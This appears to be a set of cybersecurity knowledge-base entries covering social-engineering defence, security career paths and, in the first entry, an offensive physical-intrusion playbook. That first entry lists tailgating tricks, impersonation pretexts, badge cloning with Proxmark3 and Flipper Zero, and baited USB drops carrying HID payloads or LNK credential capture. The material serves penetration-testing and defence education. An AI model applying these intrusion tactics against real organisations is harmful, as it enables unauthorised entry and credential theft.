content: Physical SE bypasses all digital controls. Tailgating success rate: 70-80% of attempts. Hands full method: carrying boxes/equipment causes people to hold doors. Smoker's entrance: propped doors at smoking areas consistently weakest physical entry. Impersonation pretexts: IT contractor (most universal), delivery person (high volume expected), fire inspector (authority + access anywhere), cleaning crew (invisible, after-hours access), new employee (forgiven for confusion). Physical tools: Proxmark3 (clone HID/MIFARE/iClass RFID badges, professional), Flipper Zero (125kHz RFID at badge distance, covert), lock pick set (most interior office doors trivial), USB drops (label as 'Q4 Salaries' — 45-98% plug-in rate, deploy HID payloads or LNK credential capture). Dumpster diving finds: org charts, credentials on sticky notes, old hard drives, system diagrams. Physical engagement phases: passive recon (observe from distance), active recon (lobby visit), penetration (execute pretext), objective execution (document/plant devices), exfil and report.

title: Social Engineering Defense — Building the Human Firewall
content: Annual compliance training fails — 70% forgotten within 72 hours. What works: monthly simulated phishing with immediate teachable feedback (not punishment), role-specific training (finance gets BEC training, not generic), psychological safety to report mistakes, easy reporting mechanisms. Target metrics: click rate <5%, credential submission <1%, report rate >70% (reporting is the win). Technical controls: email security gateway, DMARC/SPF/DKIM enforcement, phishing-resistant MFA (FIDO2/passkeys — immune to Evilginx2 reverse proxy attacks; TOTP and SMS are NOT sufficient). Process controls: password resets never over phone (self-service portal only), wire transfers require dual auth plus out-of-band callback, visitor pre-registration required, badge challenge policy. MITRE ATT&CK mapping: T1566.001 (spearphishing attachment), T1566.002 (spearphishing link), T1534 (internal spearphishing/BEC), T1557 (adversary-in-the-middle/Evilginx), T1078 (valid accounts — credential theft outcome). Detection signals: DNS queries to new domains, HTTP POST to unfamiliar external IPs, password resets correlated with phone activity, new process execution from browser.

title: Cybersecurity Career Paths
content: SOC Analyst (L1/L2/L3): monitor SIEM alerts, triage incidents, investigate threats, use EDR/SOAR. Entry point for many. Penetration Tester: attack systems with written authorization, report findings with business context. Needs offensive skills + certifications + report writing. Red Team Operator: simulate advanced persistent threats (APTs), multi-stage campaigns, C2 frameworks (Cobalt Strike, Sliver, Brute Ratel). Needs years of pentesting experience. Blue Team / Defender: protect and detect, SIEM (Splunk/Sentinel), EDR (CrowdStrike/SentinelOne), forensics, threat hunting. Purple Team: bridges red and blue, validates controls by running attacks then measuring detection. Security Engineer: builds security systems, cloud security, DevSecOps. AppSec: secure code review, SAST/DAST tools. GRC: policy, compliance (PCI-DSS, HIPAA, SOC2), risk management. Threat Intel: track threat actors, IOCs, TTPs. Best practice platforms: HackTheBox (realistic labs), TryHackMe (guided learning), PentesterLab (web focus), VulnHub (downloadable VMs), DVWA (local web app), Metasploitable (local vulnerable VM). Build home lab: Kali + Metasploitable + VulnHub machines on VirtualBox/VMware.
